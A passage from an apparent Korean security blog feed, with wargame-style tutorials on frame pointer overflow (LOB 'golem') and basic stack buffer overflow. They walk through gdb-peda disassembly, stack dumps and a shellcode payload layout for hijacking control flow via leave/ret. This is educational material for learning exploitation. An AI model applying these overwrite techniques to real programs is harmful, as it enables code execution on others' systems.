0xbffff144:	0x34333231	0x38373635	0xbffff100	0x08048484
0xbffff154:	0x08048540	0x00000000	0xb7e2fa83	0x00000001
0xbffff164:	0xbffff1f4	0xbffff1fc&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;buf의 다음은 Save Frame Pointer 이므로 0xbffff100이 Save Frame Pointer가 됩니다.&lt;/p&gt;

&lt;p&gt;값을 입력하기 전에 SFP의 값은 0xbffff158 이었는데 0xbffff100으로 바뀐 이유는 문자열을 입력하면서 &lt;code class=&quot;highlighter-rouge&quot;&gt;마지막에 Null이 포함&lt;/code&gt;된 것입니다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h3 id=&quot;이해&quot;&gt;이해&lt;/h3&gt;
&lt;p&gt;LOB의 golem 소소코드를 이용하여 SFP를 실습해 보도록 하겠습니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;proglem_child&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;strncpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;argv error&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;prolem_child&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;main 함수에서 argv로 인자 값을 받아오고 해당 값을 problem_child 함수에서 src로 받습니다.
src로 받은 값을 buffer에 41개 만큼 저장합니다.&lt;/p&gt;

&lt;p&gt;여기서 중요한 것은 &lt;code class=&quot;highlighter-rouge&quot;&gt;buffer의 크기는 40인데 strncpy를 이용해 41개를 넣어주는 것입니다.&lt;/code&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;pdisas main
Dump of assembler code &lt;span class=&quot;k&quot;&gt;for function &lt;/span&gt;main:
	0x080484aa &amp;lt;+0&amp;gt;:	push	ebp
	0x080484ab &amp;lt;+1&amp;gt;:	mov 	ebp,esp
	0x080484ad &amp;lt;+3&amp;gt;:	sub 	esp,0x4
	0x080484b0 &amp;lt;+6&amp;gt;:	cmp	DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ebp+0x8],0x1
	0x080484b4 &amp;lt;+10&amp;gt;:	jg	0x80484ce &amp;lt;main+36&amp;gt;
	0x080484b6 &amp;lt;+12&amp;gt;:	mov	DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp],0x8048570
	0x080484bd &amp;lt;+19&amp;gt;:	call	0x8048330 &amp;lt;puts@plt&amp;gt;
	0x080484c2 &amp;lt;+24&amp;gt;:	mov	DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp],0x0
	0x080484c9 &amp;lt;+31&amp;gt;:	call	0x8048350 &amp;lt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;@plt&amp;gt;
	0x080484ce &amp;lt;+36&amp;gt;:	mov	eax, DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ebp+0xc]
	0x080484d1 &amp;lt;+39&amp;gt;:	add 	eax,0x4
	0x080484d4 &amp;lt;+42&amp;gt;:	mov	eax,DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;eax]
	0x080484d6 &amp;lt;+44&amp;gt;:	mov	DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp],eax
	0x080484d9 &amp;lt;+47&amp;gt;:	call	0x804847d &amp;lt;problem_child&amp;gt;
	0x080484de &amp;lt;+52&amp;gt;:	leave
	0x080484df &amp;lt;+53&amp;gt;:	ret
End of assembler dump.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;problem_child 위치에 Breakpoint를 걸고 `python -c ‘print “A”*40 + “B”’`를 이용해 argv[1]에 값을 넣고 problem_child 함수 안으로 들어갑니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Dump of assembler code &lt;span class=&quot;k&quot;&gt;for function &lt;/span&gt;problem_child:
&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;gt;	0x0804847d &amp;lt;+0&amp;gt;:	push	ebp
	0x0804847e &amp;lt;+1&amp;gt;:	mov 	ebp,esp
	0x08048480 &amp;lt;+3&amp;gt;:	sub 	esp,0x34
	0x08048483 &amp;lt;+6&amp;gt;:	mov	DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp+0x8],0x29
	0x0804848b &amp;lt;+14&amp;gt;:	mov	eax,DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ebp+0x8]
	0x0804848e &amp;lt;+17&amp;gt;:	mov	DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp+0x4],eax
	0x08048492 &amp;lt;+21&amp;gt;:	lea 	eax,[ebp-0x28]
	0x08048495 &amp;lt;+24&amp;gt;:	mov 	DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp],eax
	0x08048498 &amp;lt;+27&amp;gt;:	call 	0x8048370 &amp;lt;strncpy@plt&amp;gt;
	0x0804849d &amp;lt;+32&amp;gt;:	lea 	eax,[ebp-0x28]
	0x080484a0 &amp;lt;+35&amp;gt;:	mov	DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp],eax
	0x080484a3 &amp;lt;+38&amp;gt;:	call	0x8048330 &amp;lt;puts@plt&amp;gt;
	0x080484a8 &amp;lt;+43&amp;gt;:	leave
	0x080484a9 &amp;lt;+44&amp;gt;:	ret
End of assembler dump.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x804849d&lt;/code&gt;에 Breakpoint를 걸고 buf의 값을 확인해 보도록 하겠습니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Dump of assembler code &lt;span class=&quot;k&quot;&gt;for function &lt;/span&gt;problem_child:
	0x0804847d &amp;lt;+0&amp;gt;:	push	ebp
	0x0804847e &amp;lt;+1&amp;gt;:	mov 	ebp,esp
	0x08048480 &amp;lt;+3&amp;gt;:	sub 	esp,0x34
	0x08048483 &amp;lt;+6&amp;gt;:	mov	DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp+0x8],0x29
	0x0804848b &amp;lt;+14&amp;gt;:	mov	eax,DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ebp+0x8]
	0x0804848e &amp;lt;+17&amp;gt;:	mov	DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp+0x4],eax
	0x08048492 &amp;lt;+21&amp;gt;:	lea 	eax,[ebp-0x28]
	0x08048495 &amp;lt;+24&amp;gt;:	mov 	DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp],eax
	0x08048498 &amp;lt;+27&amp;gt;:	call 	0x8048370 &amp;lt;strncpy@plt&amp;gt;
	0x0804849d &amp;lt;+32&amp;gt;:	lea 	eax,[ebp-0x28]
	0x080484a0 &amp;lt;+35&amp;gt;:	mov	DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp],eax
	0x080484a3 &amp;lt;+38&amp;gt;:	call	0x8048330 &amp;lt;puts@plt&amp;gt;
	0x080484a8 &amp;lt;+43&amp;gt;:	leave
	0x080484a9 &amp;lt;+44&amp;gt;:	ret
End of assembler dump.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;x/10wx &lt;span class=&quot;nv&quot;&gt;$ebp&lt;/span&gt;-0x28
0xbffff0f4:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff104:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff114:	0x41414141	0x41414141	0xbffff142 	0x080484de
0xbffff124:	0xbffff39f	0x00000000 	0xb7e2fa83 	0x00000002
0xbffff134:	0xbffff1c4	0xbffff1d0	0xb7feccea	0x00000002&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;40개의 A와 B를 넣었더니 위와 같이 buf에 값이 채워졌습니다. 그리고 SFP의 값이 &lt;code class=&quot;highlighter-rouge&quot;&gt;0xbffff142&lt;/code&gt;로 변조된 것도 확인할 수 있습니다.&lt;/p&gt;

&lt;p&gt;이 변조된 값을 &lt;code class=&quot;highlighter-rouge&quot;&gt;함수의 에필로그&lt;/code&gt;를 이용하여 리턴 값을 조작할 수 있습니다.&lt;/p&gt;

&lt;p&gt;함수의 에필로그는 &lt;code class=&quot;highlighter-rouge&quot;&gt;leave&lt;/code&gt;와 &lt;code class=&quot;highlighter-rouge&quot;&gt;ret&lt;/code&gt;이 있는데 이 어셈블리어는 각각 &lt;code class=&quot;highlighter-rouge&quot;&gt;mov esp, ebp&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;pop ebp&lt;/code&gt;와 &lt;code class=&quot;highlighter-rouge&quot;&gt;pop eip&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;jmp eip&lt;/code&gt;가 됩니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;pdisas main
Dump of assembler code &lt;span class=&quot;k&quot;&gt;for function &lt;/span&gt;main:
	0x080484aa &amp;lt;+0&amp;gt;:	push	ebp
	0x080484ab &amp;lt;+1&amp;gt;:	mov 	ebp,esp
	0x080484ad &amp;lt;+3&amp;gt;:	sub 	esp,0x4
	0x080484b0 &amp;lt;+6&amp;gt;:	cmp	DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ebp+0x8],0x1
	0x080484b4 &amp;lt;+10&amp;gt;:	jg	0x80484ce &amp;lt;main+36&amp;gt;
	0x080484b6 &amp;lt;+12&amp;gt;:	mov	DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp],0x8048570
	0x080484bd &amp;lt;+19&amp;gt;:	call	0x8048330 &amp;lt;puts@plt&amp;gt;
	0x080484c2 &amp;lt;+24&amp;gt;:	mov	DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp],0x0
	0x080484c9 &amp;lt;+31&amp;gt;:	call	0x8048350 &amp;lt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;@plt&amp;gt;
	0x080484ce &amp;lt;+36&amp;gt;:	mov	eax, DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ebp+0xc]
	0x080484d1 &amp;lt;+39&amp;gt;:	add 	eax,0x4
	0x080484d4 &amp;lt;+42&amp;gt;:	mov	eax,DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;eax]
	0x080484d6 &amp;lt;+44&amp;gt;:	mov	DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp],eax
	0x080484d9 &amp;lt;+47&amp;gt;:	call	0x804847d &amp;lt;problem_child&amp;gt;
&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;gt;	0x080484de &amp;lt;+52&amp;gt;:	leave
	0x080484df &amp;lt;+53&amp;gt;:	ret
End of assembler dump.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;main에서 leave 위치까지 실행한 뒤에 ebp와 esp를 확인하면 아래와 같습니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;i r ebp
ebp 	0xbffff142 	0xbffff142&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;ebp를 확인한 결과 조작된 0xbffff142가 되었습니다. 여기서 leave 명령을 실행하면 &lt;code class=&quot;highlighter-rouge&quot;&gt;mov esp,ebp&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;pop ebp&lt;/code&gt; 이므로 ebp의 값을 esp로 옮기고 pop하여 ebp에 저장합니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;i r ebp esp
ebp 	0xf1c40000 	0xf1c40000
esp 	0xbffff146 	0xbffff146&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;변조 된 ebp 값이 &lt;code class=&quot;highlighter-rouge&quot;&gt;mov esp, ebp&lt;/code&gt;를 통해서 esp에 저장이 되었고 &lt;code class=&quot;highlighter-rouge&quot;&gt;pop ebp&lt;/code&gt;를 하면서 +4 만큼 증가되었습니다.&lt;/p&gt;

&lt;p&gt;그래서 esp의 값이 0xbffff146이 됩니다. (0xbffff142 + 0x4)&lt;/p&gt;

&lt;p&gt;그 후 0xbffff146에 있는 값을 &lt;code class=&quot;highlighter-rouge&quot;&gt;pop eip&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;jmp eip&lt;/code&gt;하면서 해당 위치로 이동하게 됩니다.&lt;/p&gt;

&lt;p&gt;따라서 &lt;code class=&quot;highlighter-rouge&quot;&gt;|shellcode 주소|\x90*n|shellcode|stack 주소 - 0x4|&lt;/code&gt;와 같은 payload를 사용할 수 있습니다.&lt;/p&gt;</content><author><name></name></author><summary type="html">개념</summary></entry><entry><title type="html">Buffer Overflow</title><link href="http://localhost:4000/technique/system_hacking/2017/07/24/Buffer_OverFlow.html" rel="alternate" type="text/html" title="Buffer Overflow" /><published>2017-07-24T15:03:00+09:00</published><updated>2017-07-24T15:03:00+09:00</updated><id>http://localhost:4000/technique/system_hacking/2017/07/24/Buffer_OverFlow</id><content type="html" xml:base="http://localhost:4000/technique/system_hacking/2017/07/24/Buffer_OverFlow.html">&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h3 id=&quot;개념&quot;&gt;개념&lt;/h3&gt;

&lt;p&gt;Buffer Overflow (이하 bof)는 크기가 정해진 배열에 해당 크기 만큼 입력해야 하지만 &lt;code class=&quot;highlighter-rouge&quot;&gt;버퍼보다 큰 값&lt;/code&gt;
을 넣을 수 있는 취약점을 말합니다.&lt;/p&gt;

&lt;p&gt;예를들어, &lt;code class=&quot;highlighter-rouge&quot;&gt;char buf[10]&lt;/code&gt;로 선언했다면 buf는 총 10개의 공간을 갖게 됩니다. 하지만 프로그램이 실행 되면서 buf에 10개가 아닌 11개, 12개 혹은 그 이상의 값이 들어가는 것을 확인하지 않고 실행 하므로서 발생하는 취약점을 뜻 합니다.&lt;/p&gt;

&lt;p&gt;그래서 bof는 stack corruption으로도 불립니다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h3 id=&quot;설명&quot;&gt;설명&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;위 소스코드를 보면 buf라는 char 배열에 총 8개의 값을 넣을 수 있고, scanf를 이용해서 buf에 값을 넣어줍니다. &lt;code class=&quot;highlighter-rouge&quot;&gt;scanf()&lt;/code&gt;는 &lt;code class=&quot;highlighter-rouge&quot;&gt;크기 제한&lt;/code&gt;이 없기 때문에 해당 부분에서 취약점이 발생할 수 있습니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;Dump of assembler code &lt;span class=&quot;k&quot;&gt;for function &lt;/span&gt;main:
0x0804843d &amp;lt;+0&amp;gt;:	push	ebp
0x0804843e &amp;lt;+1&amp;gt;:	mov 	ebp,esp
0x08048440 &amp;lt;+3&amp;gt;:	sub 	esp,0x10
0x08048443 &amp;lt;+6&amp;gt;:	lea 	eax,[ebp-0x8]
0x08048446 &amp;lt;+9&amp;gt;:	mov	DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp+0x4],eax
0x0804844a &amp;lt;+13&amp;gt;:	mov	DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp], 0x80484f0
0x08048451 &amp;lt;+20&amp;gt;:	call	0x80484330 &amp;lt;__isoc99_scanf@plt&amp;gt;
0x08048456 &amp;lt;+25&amp;gt;:	mov	eax,0x0
0x0804845b &amp;lt;+30&amp;gt;:	leave
0x0804845c &amp;lt;+31&amp;gt;:	ret
End of assembler dump.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;위 코드에서 &lt;code class=&quot;highlighter-rouge&quot;&gt;push ebp&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;mov ebp,esp&lt;/code&gt;가 함수의 프롤로그가 되며, &lt;code class=&quot;highlighter-rouge&quot;&gt;leave&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;ret&lt;/code&gt;이 함수의 에필로그가 됩니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;0x08048446 &amp;lt;+9&amp;gt;:	mov	DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp+0x4],eax
0x0804844a &amp;lt;+13&amp;gt;:	mov	DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp], 0x80484f0
0x08048451 &amp;lt;+20&amp;gt;:	call	0x80484330 &amp;lt;__isoc99_scanf@plt&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;스택 구조에 대해서 설명을 붙이자면 위 어셈블리 코드를 보면 scanf가 실행되기 전 &lt;code class=&quot;highlighter-rouge&quot;&gt;esp&lt;/code&gt;와 &lt;code class=&quot;highlighter-rouge&quot;&gt;esp+0x4&lt;/code&gt;에 값을 넣고 있는 것을 알 수 있습니다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;scanf&lt;/code&gt;함수는 보통 &lt;code class=&quot;highlighter-rouge&quot;&gt;scanf(&quot;%s&quot;, buf)&lt;/code&gt; 형태로 코드를 작성합니다.&lt;/p&gt;

&lt;p&gt;여기서 &lt;code class=&quot;highlighter-rouge&quot;&gt;%s&lt;/code&gt;와 &lt;code class=&quot;highlighter-rouge&quot;&gt;buf&lt;/code&gt;가 &lt;code class=&quot;highlighter-rouge&quot;&gt;인자 값&lt;/code&gt;이 되기 때문에 &lt;code class=&quot;highlighter-rouge&quot;&gt;esp&lt;/code&gt;와 &lt;code class=&quot;highlighter-rouge&quot;&gt;esp+0x4&lt;/code&gt;에 값을 넣어주게 됩니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;x/2wx &lt;span class=&quot;nv&quot;&gt;$esp&lt;/span&gt;
0xbffff148:	0x080484f0	0xbffff150
&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;x/s 0x80484f0
0x80484f0:	&lt;span class=&quot;s2&quot;&gt;&quot;%s&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;esp 위치부터 2개가 값을 확인해 보면 &lt;code class=&quot;highlighter-rouge&quot;&gt;0x80484f0&lt;/code&gt;와 &lt;code class=&quot;highlighter-rouge&quot;&gt;0xbffff150&lt;/code&gt;이 있습니다. scanf가 필요한 인자 값이 2개 이므로 각각 &lt;code class=&quot;highlighter-rouge&quot;&gt;%s&lt;/code&gt;와 &lt;code class=&quot;highlighter-rouge&quot;&gt;buf&lt;/code&gt;를 뜻하게 됩니다.&lt;/p&gt;

&lt;p&gt;scanf를 실행한 뒤에 buf의 주소를 확인해 보면 값이 쌓여있는 것을 알 수 있습니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;x/10wx 0xbffff150
0xbffff150:	0x34333231	0x00000000	0x00000000	0xb7e1fa83
0xbffff160:	0x00000001	0xbffff1f4	0xbffff1fc	0xb7feccea
0xbffff170:	0x00000001	0xbffff1f4&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;1234&lt;/code&gt;라는 값을 입력했더니 &lt;code class=&quot;highlighter-rouge&quot;&gt;0x34333231&lt;/code&gt;라는 값이 저장되었습니다. 1234라는 값이 각각 hex 값으로 저장된 것입니다. 하지만 ascii 코드를 살펴보면 4321 순으로 저장된 것을 볼 수 있습니다.&lt;/p&gt;

&lt;p&gt;이는 &lt;code class=&quot;highlighter-rouge&quot;&gt;리틀엔디안과 빅엔디안&lt;/code&gt;차이에 따라서 결정됩니다.&lt;/p&gt;

&lt;p&gt;코드를 하나씩 살펴보면서 값이 어떻게 저장되는지 확인해 봤습니다. &lt;code class=&quot;highlighter-rouge&quot;&gt;scanf&lt;/code&gt;함수에서 취약점이 발생한다고 했으니 어떻게 되는지 알아보도록 하겠습니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;x/4wx 0xbffff150
0xbffff150:	0x34333231	0x38373635	0x00000000	0xb7e1fa83&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;이번에는 &lt;code class=&quot;highlighter-rouge&quot;&gt;12345678&lt;/code&gt;을 입력했습니다. 위 스택을 살펴보면 &lt;code class=&quot;highlighter-rouge&quot;&gt;4321 8765&lt;/code&gt; 순으로 쌓인 것을 알 수 있으며 buf의 크기가 8인데 8자리를 모두 사용했습니다.&lt;/p&gt;

&lt;p&gt;여기서 &lt;code class=&quot;highlighter-rouge&quot;&gt;scanf 함수는 크기를 제한하지 않으므로&lt;/code&gt; 값을 더 입력해 보겠습니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;x/4wx 0xbffff150
0xbffff150:	0x34333231	0x38373635	0x32313039	0x36353433&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;값을 더 입력했더니 뒤에 존재했던 값들이 모두 덮어 씌워졌습니다.&lt;/p&gt;

&lt;p&gt;이 상태에서 프로그램을 진행 시키면 &lt;code class=&quot;highlighter-rouge&quot;&gt;0x36353433 in ?? ()&lt;/code&gt; 과 같이 나타납니다. 이 말은 &lt;code class=&quot;highlighter-rouge&quot;&gt;0x36353433 주소로 이동&lt;/code&gt;을 했다는 것 입니다.&lt;/p&gt;

